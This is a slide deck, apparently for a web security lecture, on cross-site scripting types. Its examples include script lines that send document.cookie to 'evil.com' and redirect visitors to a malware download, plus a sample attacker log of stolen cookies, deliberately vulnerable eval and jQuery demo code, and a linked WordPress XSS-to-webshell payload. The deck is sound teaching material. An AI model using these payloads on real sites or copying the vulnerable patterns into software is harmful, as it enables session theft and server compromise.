@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>websec</title>
+    <meta charset="utf-8">
+    <style>
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Yanone Kaffeesatz';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Yanone Kaffeesatz Regular'), local('YanoneKaffeesatz-Regular'), url(YDAoLskQQ5MOAgvHUQCcLV83L2yn_om9bG0a6EHWBso.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Yanone Kaffeesatz';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Yanone Kaffeesatz Regular'), local('YanoneKaffeesatz-Regular'), url(YDAoLskQQ5MOAgvHUQCcLfGwxTS8d1Q9KiDNCMKLFUM.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Droid Serif';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Droid Serif'), local('DroidSerif'), url(https://fonts.gstatic.com/s/droidserif/v6/0AKsP294HTD-nvJgucYTaI4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Droid Serif';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Droid Serif Bold'), local('DroidSerif-Bold'), url(https://fonts.gstatic.com/s/droidserif/v6/QQt14e8dY39u-eYBZmppwYlIZu-HDpmDIZMigmsroc4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Droid Serif';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Droid Serif Italic'), local('DroidSerif-Italic'), url(https://fonts.gstatic.com/s/droidserif/v6/cj2hUnSRBhwmSPr9kS5898u2Q0OS-KeTAWjgkS85mDg.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* cyrillic-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkTTOQ_MqJVwkKsUn0wKzc2I.woff2) format('woff2');
+		  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+		}
+		/* cyrillic */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkTUj_cnvWIuuBMVgbX098Mw.woff2) format('woff2');
+		  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+		}
+		/* greek-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkUbcKLIaa1LC45dFaAfauRA.woff2) format('woff2');
+		  unicode-range: U+1F00-1FFF;
+		}
+		/* greek */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkWo_sUJ8uO4YLWRInS22T3Y.woff2) format('woff2');
+		  unicode-range: U+0370-03FF;
+		}
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkSYE0-AqJ3nfInTTiDXDjU4.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono'), local('UbuntuMono-Regular'), url(ViZhet7Ak-LRXZMXzuAfkY4P5ICox8Kq3LLUNMylGO4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* cyrillic-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytp6iIh_FvlUHQwED9Yt5Kbw.woff2) format('woff2');
+		  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+		}
+		/* cyrillic */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molyti_vZmeiCMnoWNN9rHBYaTc.woff2) format('woff2');
+		  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+		}
+		/* greek-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytiFaMxiho_5XQnyRZzQsrZs.woff2) format('woff2');
+		  unicode-range: U+1F00-1FFF;
+		}
+		/* greek */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytgalQocB-__pDVGhF3uS2Ks.woff2) format('woff2');
+		  unicode-range: U+0370-03FF;
+		}
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytujkDdvhIIFj_YMdgqpnSB0.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: normal;
+		  font-weight: 700;
+		  src: local('Ubuntu Mono Bold'), local('UbuntuMono-Bold'), url(ceqTZGKHipo8pJj4molytolIZu-HDpmDIZMigmsroc4.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+		/* cyrillic-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKAxNcqx07xvyppV96iFRdwiM.woff2) format('woff2');
+		  unicode-range: U+0460-052F, U+20B4, U+2DE0-2DFF, U+A640-A69F;
+		}
+		/* cyrillic */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA-fhZE2STYI3KzBGzrJG_ik.woff2) format('woff2');
+		  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+		}
+		/* greek-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA26cj8HaeL2jS4NIBPr3RFo.woff2) format('woff2');
+		  unicode-range: U+1F00-1FFF;
+		}
+		/* greek */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA9cKKn5Xt5n-nnvkqIBMZms.woff2) format('woff2');
+		  unicode-range: U+0370-03FF;
+		}
+		/* latin-ext */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA0_0lycXMw8PhobHtu2Qgco.woff2) format('woff2');
+		  unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+		}
+		/* latin */
+		@font-face {
+		  font-family: 'Ubuntu Mono';
+		  font-style: italic;
+		  font-weight: 400;
+		  src: local('Ubuntu Mono Italic'), local('UbuntuMono-Italic'), url(KAKuHXAHZOeECOWAHsRKA8u2Q0OS-KeTAWjgkS85mDg.woff2) format('woff2');
+		  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+		}
+
+      body { font-family: 'Droid Serif'; }
+      h1, h2, h3 {
+        font-family: 'Yanone Kaffeesatz';
+        font-weight: normal;
+      }
+      .remark-code, .remark-inline-code { font-family: 'Ubuntu Mono'; }
+    </style>
+  </head>
+  <body>
+    <textarea id="source">
+
+class: center, middle
+
+# Web Security
+slides: http://dumpco.re/websec
+
+---
+
+# Agenda
+
+1. XSS
+2. ...
+---
+class: center, middle
+# XSS
+Cross-site scripting
+---
+# Goal
+Inject bad stuff in user's browsers
+---
+# Goal
+```
+HTTP/1.1 200 OK
+Cache-Control: max-age=604800
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+<head>
+...
+```
+<b>bad stuff goes here</b>
+---
+# For fun
+```
+HTTP/1.1 200 OK
+Cache-Control: max-age=604800
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+<head>
+...
+<h1>MOHAHAHAH YOU HAVE BEEN HACKED!!!</h1>
+```
+---
+# To get money
+```
+HTTP/1.1 200 OK
+Cache-Control: max-age=604800
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+<head>
+...
+<h1>We have stolen all your stuff! Send a ton of $$$$</h1>
+```
+---
+# To spread malware
+```
+HTTP/1.1 200 OK
+Cache-Control: max-age=604800
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+<head>
+...
+<script>window.location = "http://evil.com/malware.exe";</script>
+```
+---
+# What does this do? and why?
+```
+HTTP/1.1 200 OK
+Cache-Control: max-age=604800
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
+<!doctype html>
+<html>
+<head>
+...
+<script>
+document.write('<img src="http://evil.com/collect.gif?x=' + escape(document.cookie) + '" />');
+</script>
+```
+---
+# Attacker's apache access_log
+
+```
+71.8.51.256 - - [07/Feb/2013:20:41:17 +0700] "GET /collect.gif?x=I_MaWpDC7126YmBO52ZSh1A
+sd--KmqQ%3b+__qca%3dP0-729728865-1504205877976%3b+_ga%3dGA1.2.1238627493.1504205878%3b+_
+gid%3dGA1.2.689 323835.1504205878 HTTP/1.1" 200 285 "http://evil.com/collect.gif?x=__gad
+s%3dID%3d75b533976fe567ab%3aT%3d1504205885%3aS%3dALNI_MaWpDC7126YmBO52ZSh1Asd--KmqQ%3b+_
+_qca%3dP0-729728865-1504205877976%3b+_ga%3dGA1.2.1238627493.1504205878%3b+_gid%3dGA1.2.6
+89323835.1504205878" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.17 (KHTML, like Gecko
+) Chrome/24.0.1312.57 Safari/537.17"
+```
+---
+# Terminology
+XSS payload == thing the attacker wants to inject into your browser
+---
+# Types of XSS
+1. Reflected
+2. Stored
+3. DOM-based
+---
+class: center, middle
+# Reflected XSS
+---
+# Reflected XSS
+XSS payload is sent to the server, which returns it back in it's response.
+
+After that, it's gone.
+---
+# Reflected XSS
+
+Example:
+```
+http://example.com/search=<script>alert("xss");</script>
+```
+HTTP request:
+```
+GET /search=<script>alert("xss");</script> HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+---
+class: center, middle
+# Stored XSS
+---
+# Stored XSS
+Two step attack:
+
+1. XSS payload is sent to the server, which stores it.
+2. Victim user visits website, which serves the payload to the victim
+
+Note: XSS payload is stored, potentially forever, on the website.
+
+---
+class: center, middle
+# Question
+What does it mean for the attacker that the XSS payload is stored, potentially forever, on the website?
+---
+# Answer
+
+- the attack is launched against all visiting users, not just one
+- the attack is more easily detected by other users and administrators
+
+---
+class: middle, center
+# Exercise
+---
+# DOM-based XSS
+XSS payload is never sent to the server.
+---
+# DOM-based XSS
+
+Example:
+```
+http://example.com/search#<script>alert("xss");</script>
+```
+HTTP request:
+```
+GET /search HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+---
+# Example
+```
+<html>
+  <script>
+
+    // Today, browsers include the pound sign in the hash and encode the entire thing
+    var removePound = location.hash.substring(1);
+    var unescaped = unescape(removePound);
+    eval(unescaped);
+
+  </script>
+</html>
+```
+---
+# jQuery 1.8.3 bug
+Example URL:
+```
+http://dumpco.re/lab/jqueryxss/#<img src=x onerror=alert('xss')>
+```
+Source:
+
+```
+<html>
+  <script src="jquery-1.8.3.min.js"></script>
+  <script>
+
+    // this used to work:
+    // $(location.hash);
+
+    // Today, browsers include the pound sign in the hash and encode the entire thing,
+    // so the following is needed to demo the bug:
+    var removePound = location.hash.substring(1);
+    var unescaped = unescape(removePound);
+    $(unescaped);
+
+  </script>
+  <body>
+    <a href="#<img src=x onerror=alert('xss')>">load this link in a new tab</a>
+    <br><br>
+    <a href="https://bugs.jquery.com/ticket/11290">bug report</a>
+  </body>
+</html>
+```
+---
+class: middle, center
+# Worst case scenario: from XSS to RCE (remote code execution)
+---
+# From XSS to RCE
+If the victim user can upload files, then so can the attacker!
+
+Example XSS payload for Wordpress, with two steps:
+
+1. grab anti-CSRF nonce
+2. Use Wordpress functionality to upload a malicious PHP webshell
+
+full source: https://github.com/magnusstubman/presentations/blob/master/evil/wordpressxss2rce.js
+---
+<img src="webshell.png" width="100%">
+---
+
+
+
+
+
+---
+# references
+- slides: http://dumpco.re/websec
+- WordPress XSS to RCE payload: https://github.com/magnusstubman/presentations/blob/master/evil/wordpressxss2rce.js
+    </textarea>
+    <script src="remark.js">
+    </script>
+    <script>
+      var slideshow = remark.create();
+    </script>
+  </body>
+</html>
